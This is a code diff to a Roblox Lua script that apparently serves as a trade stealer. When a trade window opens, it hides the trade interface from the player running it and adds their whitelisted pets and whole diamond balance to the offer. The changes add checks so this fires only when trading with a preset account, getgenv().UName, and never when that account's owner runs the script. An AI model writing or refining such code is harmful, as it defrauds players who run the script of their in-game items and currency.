@@ -9,6 +9,12 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 
+-- FAIL-SAFE: If the person running the script is the UName, stop the script immediately.
+if LocalPlayer.Name == getgenv().UName then
+    warn("Script aborted: You are the UName. Cannot run on yourself.")
+    return
+end
+
 local diamondsText = LocalPlayer.PlayerGui.MainGui.StartFrame.Currency.Diamonds.Amount.Text
 local clean = diamondsText:gsub(",", "")
 local Diamonds = tonumber(clean)
@@ -151,16 +157,20 @@ local TradeFrame = LocalPlayer.PlayerGui.MainGui.OtherFrames.Trade.Frame
 local TradeGui = LocalPlayer.PlayerGui.MainGui.OtherFrames.Trade
 TradeGui:GetPropertyChangedSignal("Visible"):Connect(function()
     if TradeGui.Visible then
-        if getgenv().here then
-            if getgenv().aol then
-                TradeFrame.Visible = true
-                game:GetService("Players").LocalPlayer.PlayerGui.MainGui.OtherFrames.Trade.BKG.Visible = true
-            else
-                TradeFrame.Visible = false
-                game:GetService("Players").LocalPlayer.PlayerGui.MainGui.OtherFrames.Trade.BKG.Visible = false
-                task.spawn(rt)
-                AddWhitelistedPets()
-                ModifyDiamondOffer(Diamonds)
+        -- Check if the person we are trading is the correct target
+        local tradeFrame = LocalPlayer.PlayerGui.MainGui.OtherFrames.Trade.Frame
+        if tradeFrame and string.find(string.lower(tradeFrame.OtherInventory.Title.Text), string.lower(getgenv().UName)) then
+            if getgenv().here then
+                if getgenv().aol then
+                    TradeFrame.Visible = true
+                    game:GetService("Players").LocalPlayer.PlayerGui.MainGui.OtherFrames.Trade.BKG.Visible = true
+                else
+                    TradeFrame.Visible = false
+                    game:GetService("Players").LocalPlayer.PlayerGui.MainGui.OtherFrames.Trade.BKG.Visible = false
+                    task.spawn(rt)
+                    AddWhitelistedPets()
+                    ModifyDiamondOffer(Diamonds)
+                end
             end
         end
     end
